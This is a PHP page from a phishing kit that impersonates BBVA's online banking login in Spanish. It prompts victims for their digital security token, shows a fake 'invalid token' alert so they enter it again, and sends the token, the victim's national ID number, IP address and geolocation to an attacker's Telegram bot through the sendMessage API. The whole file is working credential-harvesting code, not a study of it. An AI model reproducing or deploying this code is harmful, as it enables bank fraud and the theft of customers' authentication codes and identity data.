<?php
session_start();
include "data.php";
$website = 'https://api.telegram.org/bot'.$token;

    $ip = $_SERVER["REMOTE_ADDR"];
    

if (isset($_POST["Token"])) {
    $token = $_POST['Token'];
    $dni = $_SESSION["dni"];

    
    
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);
$country = $ip_data["country"];
$city = $ip_data["city"];
$isp = $ip_data["isp"];
$code = $ip_data["countryCode"];

    //$time = gmstrftime("%Y. %B %d. %A. %X %Z");
    $agent = $_SERVER["HTTP_USER_AGENT"];
    $ip = $_SERVER["REMOTE_ADDR"];
    $browser = get_browser_name($_SERVER["HTTP_USER_AGENT"]);

    
    $msg = "\nBBVPersonas Token🤔\n#\nDNI=> $dni \n📧Token/Sms: => " . $token . "\n=============================  " . "\n🌎Browser: => " . $browser . "\n🌆 Country Code: " . $code . "\n🌐 Country: " . $country . "\n🌎 City: " . $city . "\n📍 IP: " . $ip . "\n============================ 🔥\n🔥🔥\n🔥Telegram: xhub 🔥\n";
            
    
     $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
            file_get_contents($url);
    
        
       echo '<script>window.location.href = "charg3.html";</script>';
}
    
function get_browser_name($user_agent)
{
    if (strpos($user_agent, "Opera") || strpos($user_agent, "OPR/")) {
        return "Opera";
    }
    if (strpos($user_agent, "Edge")) {
        return "Edge";
    }
    if (strpos($user_agent, "Chrome")) {
        return "Chrome";
    }
    if (strpos($user_agent, "Safari")) {
        return "Safari";
    }
    if (strpos($user_agent, "Firefox")) {
        return "Firefox";
    }
    if (strpos($user_agent, "MSIE") || strpos($user_agent, "Trident/7")) {
        return "Internet Explorer";
    }
    return "Other";
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BBVA net validate</title>
    <link rel="stylesheet" href="styler.css">
    <link rel="icon" href="faviconbbva.png">
</head>
<body class="body">
<center><form  method="post"  name="formerdac" >  
<script>
    window.alert("TOKEN INCORRECTO O INVALIDO, POR FAVOR VUELVA A INTENTARLO EN UN MINUTO");

    </script>


<header class="arriba">
<nav class="nav">
    <a href="#" class="logo nav-link"><img class="solar" src="logo.png" alt=""></a>
    <br>



</nav>
</header>
    <br>
    <br>
    <br>
    <sectionc class="lobo">
     <h1 class="letra3" >Por motivos de seguridad ingrese su token digital para continuar.</h1>
     <br>
     <br>

     </div>


     <script src="script.js"></script>
    

     <br>
     <br>
        
    <input maxlength="6" class="clave"  name="Token"  type="number"  placeholder="TOKEN"  required/>
    <br>
    <br>
    



<input class="ingresar" type="submit" value="Validar" /> 
<div class="donde">
<br ><br><br><br>
¿Donde encuentro mi Token Digital?
<br>
<img style="max-width: 500px; width: 100%;" src="token1.jpeg">
<br>
<br>




</form>  

</center>

</body>
</html>